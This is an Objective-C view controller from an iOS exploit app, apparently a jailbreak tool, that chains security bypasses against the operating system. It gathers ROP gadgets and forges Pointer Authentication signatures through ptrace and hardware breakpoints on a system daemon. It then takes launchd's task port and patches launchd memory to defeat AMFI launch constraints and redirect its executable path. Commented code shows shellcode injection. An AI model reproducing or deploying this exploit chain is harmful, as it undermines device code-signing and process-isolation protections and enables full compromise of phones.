//
//  ViewController.m
//  TaskPortHaxxApp
//
//  Created by Duy Tran on 24/10/25.
//

@import Darwin;
@import MachO;
@import XPC;
#include <sys/wait.h>
#import <IOKit/IOKitLib.h>
#import "ProcessContext.h"
#import "ViewController.h"
#import "Header.h"

struct dyld_all_image_infos *_alt_dyld_get_all_image_infos(void) {
    static struct dyld_all_image_infos *result;
    if (result) {
        return result;
    }
    struct task_dyld_info dyld_info;
    mach_vm_address_t image_infos;
    mach_msg_type_number_t count = TASK_DYLD_INFO_COUNT;
    kern_return_t ret;
    ret = task_info(mach_task_self_,
                    TASK_DYLD_INFO,
                    (task_info_t)&dyld_info,
                    &count);
    if (ret != KERN_SUCCESS) {
        return NULL;
    }
    image_infos = dyld_info.all_image_info_addr;
    result = (struct dyld_all_image_infos *)image_infos;
    return result;
}
NSDictionary *getLaunchdStringOffsets(void) {
    NSMutableDictionary *dict = [NSMutableDictionary dictionary];
    
    char *path = "/sbin/launchd";
    int fd = open(path, O_RDONLY);
    struct stat s;
    fstat(fd, &s);
    const struct mach_header_64 *map = mmap(NULL, s.st_size, PROT_READ, MAP_SHARED, fd, 0);
    assert(map != MAP_FAILED);
    
    size_t size = 0;
    char *cstring = (char *)getsectiondata(map, SEG_TEXT, "__cstring", &size);
    assert(cstring);
    while (size > 0) {
        dict[@(cstring)] = @(cstring - (char *)map);
        uint64_t off = strlen(cstring) + 1;
        cstring += off;
        size -= off;
    }
    
    munmap((void *)map, s.st_size);
    close(fd);
    return dict;
}

uint64_t getDyldPACIAOffset(uint64_t _dyld_start) {
    void *handle = dlopen("/usr/lib/dyld", RTLD_GLOBAL);
    uint32_t *func = (uint32_t *)dlsym(RTLD_DEFAULT, "_dyld_start");
    uint32_t *dyld_start_func = func;

    // 1. find where `B start`
    for (; (*func & 0xFC000000) != 0x14000000;/* b */ func++) {}
    // printf("B start: %p\n", func);

    // 2. obtain offset where branch
    uint32_t imm26 = *func & 0x3ffffff;
    int32_t off = (int32_t)(imm26 << 2);
    if (imm26 & (1<<25)) off |= 0xFC000000;
    // printf("off: %d\n", off);
    func += off/sizeof(*func);
    // printf("start: %p\n", func);

    // 3. find pacia x16, x8
    for (; (*func & 0xFFFFFFFF) != 0xDAC10110;/* pacia x16, x8 */ func++) {}
    // printf("pacia x16, x8 in start: %p\n", func);
    off = (uint32_t)dyld_start_func - (uint32_t)func;

    uint64_t pacia_inst = _dyld_start - off;
    return pacia_inst;
}

@interface ViewController ()
@property(nonatomic) mach_port_t fakeBootstrapPort;
@property(nonatomic) ProcessContext *dtProc;
@property(nonatomic) ProcessContext *ubProc;
@property(nonatomic) UITextView *logTextView;
@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    self.navigationItem.title = @"Task Port Haxx";
    self.navigationItem.leftBarButtonItem = [[UIBarButtonItem alloc] initWithTitle:@"Options" menu:[UIMenu menuWithTitle:@"Options" children:@[
        [UIAction actionWithTitle:@"Change Signed Pointer" image:nil identifier:nil handler:^(__kindof UIAction * _Nonnull action) {
            [self changePtrTapped];
        }],
        [UIAction actionWithTitle:@"Userspace reboot" image:nil identifier:nil handler:^(__kindof UIAction * _Nonnull action) {
            [self userspaceRebootTapped];
        }]
    ]]];
    self.navigationItem.rightBarButtonItems = @[
        [[UIBarButtonItem alloc] initWithTitle:@"Test" style:UIBarButtonItemStylePlain target:self action:@selector(testButtonTapped)],
        [[UIBarButtonItem alloc] initWithTitle:@"Arb Call" style:UIBarButtonItemStylePlain target:self action:@selector(arbCallButtonTapped)],
        [[UIBarButtonItem alloc] initWithTitle:@"Detach" style:UIBarButtonItemStylePlain target:self action:@selector(detachButtonTapped)]
    ];
    
    UITextView *textView = [[UITextView alloc] initWithFrame:self.view.bounds];
    textView.editable = NO;
    textView.autoresizingMask = UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight;
    textView.text = @"Log Output:\n";
    textView.font = [UIFont monospacedSystemFontOfSize:14 weight:UIFontWeightRegular];
    [self.view addSubview:textView];
    self.logTextView = textView;
    [self redirectStdio];
    
    // load trust cache if available. though this is only loaded once per boot we check it again
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        if(spawn_stage1_prepare_process() != 0) return;
        
        NSString *assetDir = [NSFileManager.defaultManager URLsForDirectory:NSDocumentDirectory inDomains:NSUserDomainMask].lastObject.path;
        NSString *tcPath = [assetDir stringByAppendingPathComponent:@"AssetData/.TrustCache"];
        if(load_trust_cache(tcPath) == 0) {
            printf("Trust cache loaded.\n");
        } else {
            printf("Failed to load trust cache.\n");
        }
        
        // preflight UpdateBrainService
        [self.ubProc spawnProcess:@"updatebrain" suspended:NO];
        printf("Spawned UpdateBrainService with PID %d\n", self.ubProc.pid);
        
    });
    
    // find launchd string offsets
    NSUserDefaults *defaults = NSUserDefaults.standardUserDefaults;
    if (!defaults.offsetLaunchdPath) {
        NSDictionary *offsets = getLaunchdStringOffsets();
        defaults.offsetLaunchdPath = [offsets[@"/sbin/launchd"] unsignedLongValue];
        // AMFI is only needed for iOS 17.0 to bypass launch constraint
        defaults.offsetAMFI = [offsets[@"AMFI"] unsignedLongValue];
        printf("Found launchd path string offset: 0x%lx\n", defaults.offsetLaunchdPath);
        if (defaults.offsetAMFI) {
            printf("Found AMFI string offset: 0x%lx\n", defaults.offsetAMFI);
        }
    }
    
    self.fakeBootstrapPort = setup_fake_bootstrap_server();
    self.dtProc = [[ProcessContext alloc] initWithExceptionPortName:@"com.kdt.taskporthaxx.dtsecurity_exception_server"];
    self.ubProc = [[ProcessContext alloc] initWithExceptionPortName:@"com.kdt.taskporthaxx.updatebrain_exception_server"];
    
    // TODO: save offsets
    // unauthenticated br x8 gadget
    void *handle = dlopen("/usr/lib/swift/libswiftDistributed.dylib", RTLD_GLOBAL);
    assert(handle != NULL);
    uint32_t *func = (uint32_t *)dlsym(RTLD_DEFAULT, "swift_distributed_execute_target");
    assert(func != NULL);
    for (; *func != 0xd61f0100; func++) {}
    brX8Address = (uint64_t)func;
    printf("Found br x8 at address: 0x%016lx\n", brX8Address);
    // if br x8 != saved address, clear saved address
    uint64_t savedPpointer = NSUserDefaults.standardUserDefaults.signedPointer;
    if (savedPpointer != 0 && (brX8Address&0xFFFFFFFFF) != (savedPpointer&0xFFFFFFFFF)) {
        printf("br x8 address changed, clearing saved signed pointer\n");
        NSUserDefaults.standardUserDefaults.signedPointer = 0;
        NSUserDefaults.standardUserDefaults.signedDiversifier = 0;
    }
    
    // PAC signing gadget
    func = (uint32_t *)zeroify_scalable_zone;
    for (; func[0] != 0xdac10230 || func[1] != 0xf9000110; func++) {}
    paciaAddress = (uint64_t)func;
    printf("Found pacia x16, x17 at address: 0x%016lx\n", paciaAddress);
    
    // change LR gadget
    func = (uint32_t *)dispatch_debug;
    for (; func[0] != 0xaa0103fe || func[1] != 0xf9402008; func++) {}
    changeLRAddress = (uint64_t)func;
}

- (void)redirectStdio {
    setvbuf(stdout, 0, _IOLBF, 0); // make stdout line-buffered
    setvbuf(stderr, 0, _IONBF, 0); // make stderr unbuffered
    
    /* create the pipe and redirect stdout and stderr */
    static int pfd[2];
    pipe(pfd);
    dup2(pfd[1], fileno(stdout));
    dup2(pfd[1], fileno(stderr));
    
    /* create the logging thread */
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        ssize_t rsize;
        char buf[2048];
        while((rsize = read(pfd[0], buf, sizeof(buf)-1)) > 0) {
            if (rsize < 2048) {
                buf[rsize] = '\0';
            }
            NSString *logLine = [NSString stringWithUTF8String:buf];
            dispatch_async(dispatch_get_main_queue(), ^{
                self.logTextView.text = [self.logTextView.text stringByAppendingString:logLine];
                NSRange bottom = NSMakeRange(self.logTextView.text.length -1, 1);
                [self.logTextView scrollRangeToVisible:bottom];
            });
        }
    });
}

- (void)changePtrTapped {
    UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"Change Signed Pointer" message:@"Enter new signed pointer and diversifier value (hex):" preferredStyle:UIAlertControllerStyleAlert];
    [alert addTextFieldWithConfigurationHandler:^(UITextField *textField) {
        textField.placeholder = @"Signed Pointer (hex)";
        textField.keyboardType = UIKeyboardTypeDefault;
        textField.text = [NSString stringWithFormat:@"0x%lx", NSUserDefaults.standardUserDefaults.signedPointer];
    }];
    [alert addTextFieldWithConfigurationHandler:^(UITextField *textField) {
        textField.placeholder = @"Diversifier (hex)";
        textField.keyboardType = UIKeyboardTypeDefault;
        textField.text = [NSString stringWithFormat:@"0x%x", NSUserDefaults.standardUserDefaults.signedDiversifier];
    }];
    UIAlertAction *okAction = [UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:^(UIAlertAction *action) {
        UITextField *textField = alert.textFields.firstObject;
        NSUInteger signedPointer = strtoull(textField.text.UTF8String, NULL, 16);
        uint32_t diversifier = (uint32_t)strtoul(alert.textFields[1].text.UTF8String, NULL, 16);
        NSUserDefaults.standardUserDefaults.signedPointer = signedPointer;
        NSUserDefaults.standardUserDefaults.signedDiversifier = signedPointer ? diversifier : 0;
        printf("Set signed pointer to 0x%lx\n", signedPointer);
    }];
    UIAlertAction *cancelAction = [UIAlertAction actionWithTitle:@"Cancel" style:UIAlertActionStyleCancel handler:nil];
    [alert addAction:okAction];
    [alert addAction:cancelAction];
    [self presentViewController:alert animated:YES completion:nil];
}

- (void)userspaceRebootTapped {
    UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"Userspace Reboot" message:@"This will renew the PAC signature." preferredStyle:UIAlertControllerStyleAlert];
    UIAlertAction *rebootAction = [UIAlertAction actionWithTitle:@"Reboot" style:UIAlertActionStyleDestructive handler:^(UIAlertAction *action) {
        userspaceReboot();
    }];
    UIAlertAction *cancelAction = [UIAlertAction actionWithTitle:@"Cancel" style:UIAlertActionStyleCancel handler:nil];
    [alert addAction:rebootAction];
    [alert addAction:cancelAction];
    [self presentViewController:alert animated:YES completion:nil];
}

- (void)testButtonTapped {
    printf("Currently do nothing\n");
}

- (void)performBypassPAC {
    kern_return_t kr;
    vm_size_t page_size = getpagesize();
    
    // attach to dtsecurity
    kr = (int)RemoteArbCall(self.ubProc, ptrace, PT_ATTACHEXC, self.dtProc.pid, 0, 0);
    printf("ptrace(PT_ATTACHEXC) returned %d\n", kr);
    kr = (int)RemoteArbCall(self.ubProc, ptrace, PT_CONTINUE, self.dtProc.pid, 1, 0);
    printf("ptrace(PT_CONTINUE) returned %d\n", kr);
    
    while (!self.dtProc.newState) {
#warning TODO: maybe another semaphore
        usleep(200000);
    }
    dtsecurityTaskPort = self.dtProc.taskPort;
    //bootstrap_register(bootstrap_port, "com.kdt.taskporthaxx.dtsecurity_task_port", dtsecurityTaskPort);
    if(!dtsecurityTaskPort) {
        printf("dtsecurity task port is null?\n");
        return;
    }
    
    // create a region which holds temp data
    vm_address_t map = RemoteArbCall(self.ubProc, mmap, 0, page_size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
    if (!map) {
        printf("Failed to call mmap\n");
        return;
    }
    
    // Pass dtsecurity task port to UpdateBrainService
    RemoteArbCall(self.ubProc, task_get_special_port, 0x203, TASK_BOOTSTRAP_PORT, map);
    mach_port_t remote_bootstrap_port = [self.ubProc read32:map];
    vm_address_t xpc_bootstrap_pipe = RemoteArbCall(self.ubProc, xpc_pipe_create_from_port, remote_bootstrap_port, 0, map);
    printf("xpc_bootstrap_pipe: 0x%lx\n", xpc_bootstrap_pipe);
    vm_address_t dict = RemoteArbCall(self.ubProc, xpc_dictionary_create_empty);
    vm_address_t keyStr = [self.ubProc writeString:map+0x10 string:"name"];
    vm_address_t valueStr = [self.ubProc writeString:map+0x20 string:"port"];
    RemoteArbCall(self.ubProc, xpc_dictionary_set_string, dict, keyStr, valueStr);
    RemoteArbCall(self.ubProc, _xpc_pipe_interface_routine, xpc_bootstrap_pipe, 0xcf, dict, map, 0);
    vm_address_t reply = [self.ubProc read64:map];
    mach_port_t dtsecurity_task = (mach_port_t)RemoteArbCall(self.ubProc, xpc_dictionary_copy_mach_send, reply, valueStr);
    if (!dtsecurity_task) {
        printf("Failed to get dtsecurity task port from UpdateBrainService\n");
        return;
    }
    printf("Got dtsecurity task port from UpdateBrainService: 0x%x\n", dtsecurity_task);
    
    // Get dtsecurity thread port
    vm_address_t threads = map + 0x10;
    vm_address_t thread_count = map;
    [self.ubProc write32:thread_count value:TASK_BASIC_INFO_64_COUNT];
    kr = (kern_return_t)RemoteArbCall(self.ubProc, task_threads, dtsecurity_task, threads, thread_count);
    if (kr != KERN_SUCCESS) {
        printf("task_threads failed: %s\n", mach_error_string(kr));
        return;
    }
    threads = [self.ubProc read64:threads];
    thread_t dtsecurity_thread = (thread_t)[self.ubProc read32:threads];
    printf("dtsecurity thread port: 0x%x\n", dtsecurity_thread);
    
    // Get dtsecurity debug state
    arm_debug_state64_t *debug_state = (arm_debug_state64_t *)(map + 0x10);
    vm_address_t debug_state_count = map;
    [self.ubProc write32:debug_state_count value:ARM_DEBUG_STATE64_COUNT];
    kr = (kern_return_t)RemoteArbCall(self.ubProc, thread_get_state, dtsecurity_thread, ARM_DEBUG_STATE64, (uint64_t)debug_state, debug_state_count);
    if (kr != KERN_SUCCESS) {
        printf("thread_get_state(ARM_DEBUG_STATE64) failed: %s\n", mach_error_string(kr));
        return;
    }
    
    // Find pacia instruction in dyld`start
    uint64_t _dyld_start = self.dtProc.newState->__pc;
    xpaci(_dyld_start);
    uint64_t pacia_inst = getDyldPACIAOffset(_dyld_start);
    printf("_dyld_start: 0x%llx\n", _dyld_start);
    printf("pacia: 0x%llx\n", pacia_inst);
    
    // Set hardware breakpoint 1 to pacia instruction
    [self.ubProc write64:(uint64_t)&debug_state->__bvr[0] value:pacia_inst];
    [self.ubProc write64:(uint64_t)&debug_state->__bcr[0] value:0x1e5];
    kr = (kern_return_t)RemoteArbCall(self.ubProc, thread_set_state, dtsecurity_thread, ARM_DEBUG_STATE64, (uint64_t)debug_state, ARM_DEBUG_STATE64_COUNT);
    if (kr != KERN_SUCCESS) {
        printf("thread_set_state(ARM_DEBUG_STATE64) failed: %s\n", mach_error_string(kr));
        return;
    }
    
    printf("Bypassing PAC right now\n");
    
    // Clear SIGTRAP
    kr = (int)RemoteArbCall(self.ubProc, ptrace, PT_THUPDATE, self.dtProc.pid, dtsecurity_thread, 0);
    RemoteArbCall(self.ubProc, kill, self.dtProc.pid, SIGCONT);
    self.dtProc.expectedLR = 0;
    [self.dtProc resume];
    printf("Resume1: PC: 0x%llx\n", self.dtProc.newState->__pc);
    
    // This shall step to pacia instruction
    self.dtProc.expectedLR = (uint64_t)-1;
    [self.dtProc resume];
    printf("Resume2: PC: 0x%llx\n", self.dtProc.newState->__pc);
    
    uint64_t currPC = self.dtProc.newState->__pc;
    xpaci(currPC);
    if (currPC != pacia_inst) {
        printf("Did not hit pacia breakpoint?\n");
        return;
    }
    self.dtProc.expectedLR = (uint64_t)self.dtProc.newState->__lr;
    printf("We hit PACIA breakpoint!\n");
    // Move our hardware breakpoint to the next instruction after pacia
    // TODO: maybe single step instead?
    [self.ubProc write64:(uint64_t)&debug_state->__bvr[0] value:pacia_inst+4];
    [self.ubProc write64:(uint64_t)&debug_state->__bcr[0] value:0x1e5];
    kr = (kern_return_t)RemoteArbCall(self.ubProc, thread_set_state, dtsecurity_thread, ARM_DEBUG_STATE64, (uint64_t)debug_state, ARM_DEBUG_STATE64_COUNT);
    if (kr != KERN_SUCCESS) {
        printf("thread_set_state(ARM_DEBUG_STATE64) failed: %s\n", mach_error_string(kr));
        return;
    }
    // Save x16 and x8 for later restore
    uint64_t origX16 = self.dtProc.newState->__x[16];
    uint64_t origX8 = self.dtProc.newState->__x[8];
    self.dtProc.newState->__x[8] = 0x74810000AA000000; // 'pc' discriminator, 0xAA diversifier
    
    // MARK: Sign pacia pointer
    self.dtProc.newState->__x[16] = xpaci(self.dtProc.newState->__pc);
    [self.dtProc resume];
    printf("Resume3: PC: 0x%llx\n", self.dtProc.newState->__pc);
    uint64_t signedPaciaPtr = self.dtProc.newState->__x[16];
    printf("Signed pacia gadget: 0x%llx\n", signedPaciaPtr);
    
    // MARK: Sign br x8 pointer
    // Step back to pacia instruction to sign br x8
    self.dtProc.newState->__x[16] = brX8Address;
    self.dtProc.newState->__pc = signedPaciaPtr;
    self.dtProc.newState->__flags &= ~__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC;
    [self.dtProc resume];
    printf("Resume4: PC: 0x%llx\n", self.dtProc.newState->__pc);
    brX8Address = self.dtProc.newState->__x[16];
    printf("Signed brX8Address: 0x%lx\n", brX8Address);
    
    // Clear hardware breakpoint
    [self.ubProc write64:(uint64_t)&debug_state->__bvr[0] value:0];
    [self.ubProc write64:(uint64_t)&debug_state->__bcr[0] value:0];
    kr = (kern_return_t)RemoteArbCall(self.ubProc, thread_set_state, dtsecurity_thread, ARM_DEBUG_STATE64, (uint64_t)debug_state, ARM_DEBUG_STATE64_COUNT);
    if (kr != KERN_SUCCESS) {
        printf("thread_set_state(ARM_DEBUG_STATE64) failed: %s\n", mach_error_string(kr));
        return;
    }
    
    // Restore original values
    self.dtProc.newState->__x[16] = origX16;
    self.dtProc.newState->__x[8] = origX8;
    self.dtProc.newState->__pc = signedPaciaPtr;
    self.dtProc.newState->__flags &= ~__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC;
    self.dtProc.expectedLR = (uint64_t)-1;
    [self.dtProc resume];
    printf("Resume5: PC: 0x%llx\n", self.dtProc.newState->__pc);
}

#define RemoteRead32(addr) [self.dtProc read32:addr]
#define RemoteRead64(addr) [self.dtProc read64:addr]
#define RemoteWrite32(addr, value_) [self.dtProc write32:addr value:value_]
#define RemoteWrite64(addr, value_) [self.dtProc write64:addr value:value_]
- (void)arbCallButtonTapped {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        [self.dtProc spawnProcess:@"dtsecurity" suspended:YES];
        printf("Spawned dtsecurity with PID %d\n", self.dtProc.pid);
        
        if (*(uint32_t *)getpagesize == 0xd503237f) {
            // we know this is arm64e hardware if some function starts with pacibsp
            [self performBypassPAC];
        } else {
            while (!self.dtProc.newState) {
#warning TODO: maybe another semaphore
                usleep(200000);
            }
        }
        
        kern_return_t kr;
        vm_size_t page_size = getpagesize();
        
        // Change LR
        self.dtProc.lr = 0xFFFFFF00;
        self.dtProc.expectedLR = 0xFFFFFF00;
        
        // Create a region which holds temp data (should we use stack instead?)
        vm_address_t map = RemoteArbCall(self.dtProc, mmap, 0, page_size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
        if (!map) {
            printf("Failed to call mmap. Please try resetting pointer and try again\n");
            return;
        }
        printf("Mapped memory at 0x%lx\n", map);
        
        // Test mkdir
//        RemoteWriteString(map, "/tmp/.it_works");
//        RemoteArbCall(self.dtProc, mkdir, map, 0700);
        
        // Get my task port
        mach_port_t dtsecurity_task = (mach_port_t)RemoteArbCall(self.dtProc, task_self_trap);
//        kr = (kern_return_t)RemoteArbCall(self.dtProc, task_for_pid, dtsecurity_task, getpid(), map);
//        if (kr != KERN_SUCCESS) {
//            printf("Failed to get my task port\n");
//            return;
//        }
//        mach_port_t my_task = (mach_port_t)RemoteRead32(map);
//        // Map the page we allocated in dtsecurity to this process
//        kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_remap, my_task, map, page_size, 0, VM_FLAGS_ANYWHERE, dtsecurity_task, map, false, map+8, map+12, VM_INHERIT_SHARE);
//        if (kr != KERN_SUCCESS) {
//            printf("Failed to create dtsecurity<->haxx shared mapping\n");
//            return;
//        }
//        vm_address_t local_map = RemoteRead64(map);
//        printf("Created shared mapping: 0x%lx\n", local_map);
//        printf("read: 0x%llx\n", *(uint64_t *)local_map);
        
        // Get launchd task port
        kr = (kern_return_t)RemoteArbCall(self.dtProc, task_for_pid, dtsecurity_task, 1, map);
        if (kr != KERN_SUCCESS) {
            printf("Failed to get launchd task port\n");
            return;
        }
        
        mach_port_t launchd_task = (mach_port_t)RemoteRead32(map);
        printf("Got launchd task port: %d\n", launchd_task);
        
        // Get remote dyld base
        RemoteWrite32((uint64_t)map, TASK_DYLD_INFO_COUNT);
        kr = (kern_return_t)RemoteArbCall(self.dtProc, task_info, launchd_task, TASK_DYLD_INFO, map + 8, map);
        if (kr != KERN_SUCCESS) {
            printf("task_info failed\n");
            return;
        }
        struct dyld_all_image_infos *remote_dyld_all_image_infos_addr = (void *)(RemoteRead64(map + 8) + offsetof(struct task_dyld_info, all_image_info_addr));
        printf("launchd dyld_all_image_infos_addr: %p\n", remote_dyld_all_image_infos_addr);
        
        // uint32_t infoArrayCount = &remote_dyld_all_image_infos_addr->infoArrayCount;
        kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_read_overwrite, launchd_task, (mach_vm_address_t)&remote_dyld_all_image_infos_addr->infoArrayCount, sizeof(uint32_t), map, map + 8);
        if (kr != KERN_SUCCESS) {
            printf("vm_read_overwrite _dyld_all_image_infos->infoArrayCount failed\n");
            return;
        }
        uint32_t infoArrayCount = RemoteRead32(map);
        printf("launchd infoArrayCount: %u\n", infoArrayCount);
        
        //const struct dyld_image_info* infoArray = &remote_dyld_all_image_infos_addr->infoArray;
        kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_read_overwrite, launchd_task, (mach_vm_address_t)&remote_dyld_all_image_infos_addr->infoArray, sizeof(uint64_t), map, map + 8);
        if (kr != KERN_SUCCESS) {
            printf("vm_read_overwrite _dyld_all_image_infos->infoArray failed\n");
            return;
        }
        
        // Enumerate images to find launchd base
        vm_address_t launchd_base = 0;
        vm_address_t infoArray = RemoteRead64(map);
        for (int i = 0; i < infoArrayCount; i++) {
            kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_read_overwrite, launchd_task, infoArray + sizeof(uint64_t[i*3]), sizeof(uint64_t), map, map + 8);
            uint64_t base = RemoteRead64(map);
            if (base % page_size) {
                // skip unaligned entries, as they are likely in dsc
                continue;
            }
            printf("Image[%d] = 0x%llx\n", i, base);
            // read magic, cputype, cpusubtype, filetype
            kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_read_overwrite, launchd_task, base, 16, map, map + 16);
            uint64_t magic = RemoteRead32(map);
            if (magic != MH_MAGIC_64) {
                printf("not a mach-o (magic: 0x%x)\n", (uint32_t)magic);
                continue;
            }
            uint32_t filetype = RemoteRead32(map + 12);
            if (filetype == MH_EXECUTE) {
                printf("found launchd executable at 0x%llx\n", base);
                launchd_base = base;
                break;
            }
        }
        
        // Reprotect rw
        // minimum page = 0x5f000;
        vm_offset_t launchd_str_off = NSUserDefaults.standardUserDefaults.offsetLaunchdPath;
        vm_offset_t amfi_str_off = NSUserDefaults.standardUserDefaults.offsetAMFI;
        
        printf("reprotecting 0x%lx\n", (launchd_base + launchd_str_off & ~PAGE_MASK));
        self.dtProc.lr = 0xFFFFFF00; // fix autibsp
        kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_protect, launchd_task, launchd_base + launchd_str_off & ~PAGE_MASK, 0x8000, false, PROT_READ | PROT_WRITE | VM_PROT_COPY);
        if (kr != KERN_SUCCESS) {
            printf("vm_protect failed: kr = %s\n", mach_error_string(kr));
            sleep(5);
            return;
        }
        
        // https://github.com/wh1te4ever/TaskPortHaxxApp/commit/327022fe73089f366dcf1d0d75012e6288916b29
        // Bypass panic by launch constraints
        // Method 2: Patch `AMFI` string that being used as _amfi_launch_constraint_set_spawnattr's arguments

        // Patch string `AMFI`
        
        const char *newStr = "AAAA\x00";
        [self.dtProc writeString:map string:newStr];
        self.dtProc.lr = 0xFFFFFF00; // fix autibsp
        kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_write, launchd_task, launchd_base + amfi_str_off, map, 5);
        if (kr != KERN_SUCCESS) {
            printf("vm_write failed\n");
            sleep(5);
            return;
        }
        [self.dtProc taskHexDump:launchd_base + amfi_str_off size:0x100 task:(mach_port_t)launchd_task map:(uint64_t)map];

        // Overwrite /sbin/launchd string to /var/.launchd
        const char *newPath = "/var/.launchd";
        [self.dtProc writeString:map string:newPath];
        self.dtProc.lr = 0xFFFFFF00; // fix autibsp
        kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_write, launchd_task, launchd_base + launchd_str_off, map, strlen(newPath));
        if (kr != KERN_SUCCESS) {
            printf("vm_write failed\n");
            sleep(5);
            return;
        }
        printf("Successfully overwrote launchd executable path string to %s\n", newPath);

        //RemoteArbCall(self.dtProc, exit, 0);
        
        // stuff
//        uint64_t remote_list = map + sizeof(uint64_t);
//        RemoteArbCall(self.dtProc, task_threads, launchd_task, remote_list, map);
//        mach_msg_type_number_t listCnt = *(uint32_t *)local_map;
//        RemoteArbCall(self.dtProc, memcpy, remote_list, RemoteRead64(remote_list), listCnt * sizeof(uint64_t));
//        thread_act_array_t act_list = (void *)local_map + sizeof(uint64_t);
//        for (int i = 0; i < listCnt; i++) {
//            printf("Thread[%d] = 0x%x\n", i, act_list[i]);
//            // panic your launchd
//            RemoteArbCall(self.dtProc, thread_abort, act_list[i]);
//        }
        
//        arm_thread_state64_internal ts;
//        RemoteArbCall(self.dtProc, memset, map+0x10, 0x41, sizeof(ts));
//        kr = RemoteArbCall(self.dtProc, thread_create_running, launchd_task, ARM_THREAD_STATE64, (uint64_t)(map+0x10), ARM_THREAD_STATE64_COUNT, (uint64_t)map);
//        printf("thread_create_running returned %d\n", kr);
//        thread_act_t tid = RemoteRead32(map);
//        printf("tid: 0x%x\n", tid);
        
//        printf("Sleeping...\n");
//        RemoteArbCall(self.dtProc, sleep, 10);
        
        // Get remote dyld base for blr x19
//        mach_port_t remote_task = (mach_port_t)RemoteArbCall(self.dtProc, task_self_trap);
//        RemoteWrite32((uint64_t)map, TASK_DYLD_INFO_COUNT);
//        kern_return_t kr = (kern_return_t)RemoteArbCall(self.dtProc, task_info, remote_task, TASK_DYLD_INFO, map + 8, map);
//        if (kr != KERN_SUCCESS) {
//            printf("task_info failed\n");
//            return;
//        }
//        struct dyld_all_image_infos *remote_dyld_all_image_infos_addr = (void *)RemoteRead64(map + 8) + offsetof(struct task_dyld_info, all_image_info_addr);
//        vm_address_t remote_dyld_base;
//        do {
//            remote_dyld_base = RemoteRead64((uint64_t)&remote_dyld_all_image_infos_addr->dyldImageLoadAddress);
//            printf("Remote dyld base: 0x%lx\n", remote_dyld_base);
//            // FIXME: why do I have to sleep a bit for dyld base to be available?
//            usleep(100000);
//        } while (remote_dyld_base == 0);
//        blrX19Address = remote_dyld_base + blrX19Offset;
        
        // We have some unitialized variables in xpc since we crashed here, so we need to fix them up
//        RemoteArbCall(self.dtProc, task_get_special_port, 0x203, TASK_BOOTSTRAP_PORT, map);
//        mach_port_t remote_bootstrap_port = RemoteRead32(map);
//        RemoteWriteString(map, "_os_alloc_once_table");
//        struct _os_alloc_once_s *remote_os_alloc_once_table = (struct _os_alloc_once_s *)RemoteArbCall(self.dtProc, dlsym, (uint64_t)RTLD_DEFAULT, map);
//        struct xpc_global_data *globalData = (struct xpc_global_data *)RemoteArbCall(self.dtProc, _os_alloc_once, (uint64_t)&remote_os_alloc_once_table[1], 472, 0);
//        RemoteWrite64((uint64_t)&remote_os_alloc_once_table[1].once, 0xFFFFFFFFFFFFFFFF);
//        vm_address_t xpc_bootstrap_pipe = RemoteArbCall(self.dtProc, xpc_pipe_create_from_port, remote_bootstrap_port, 0);
//        //RemoteRead64((uint64_t)&globalData->xpc_bootstrap_pipe);
//        printf("xpc_bootstrap_pipe: 0x%lx\n", xpc_bootstrap_pipe);
//        RemoteWrite64((uint64_t)&globalData->xpc_bootstrap_pipe, xpc_bootstrap_pipe);
        
//        RemoteArbCall(self.dtProc, (void*)dlopen, 0x41414141, 0);
//        printf("--- MARK: DONE FUNCTION CALL ---\n");
//        RemoteWriteString(map, "/tmp/.it_works");
//        RemoteArbCall(self.dtProc, mkdir, map, 0700);
        
        // submit a launch job to launchd to spawn a root process
        
        //(int)task_get_special_port((int)mach_task_self(), 4, &port); port
        // Can't JIT :(
//        void *ptrace = dlsym(RTLD_DEFAULT, "ptrace");
//        RemoteArbCall(self.dtProc, ptrace, PT_ATTACHEXC, self.sleepPid, 0, 0);
//        RemoteArbCall(self.dtProc, ptrace, PT_DETACH, self.sleepPid, 0, 0);
//        uint32_t shellcode[] = {
//            0xd2808880, // mov x0, #0x444
//            0xd65f03c0 // ret
//        };
//        RemoteWriteMemory(map, shellcode, sizeof(shellcode));
//        RemoteArbCall(self.dtProc, mprotect, map, 0x4000, PROT_READ | PROT_EXEC);
//        _tmp_ptr = (uint64_t)map;
//        RemoteArbCall(self.dtProc, ((uint64_t (*)(void))map));
    });
}

- (void)detachButtonTapped {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        RemoteArbCall(self.dtProc, sleep, 1);
    });
}

- (void)alertWithTitle:(NSString *)title message:(NSString *)message {
    UIAlertController *alert = [UIAlertController alertControllerWithTitle:title message:message preferredStyle:UIAlertControllerStyleAlert];
    UIAlertAction *okAction = [UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:nil];
    [alert addAction:okAction];
    [self presentViewController:alert animated:YES completion:nil];
}

@end
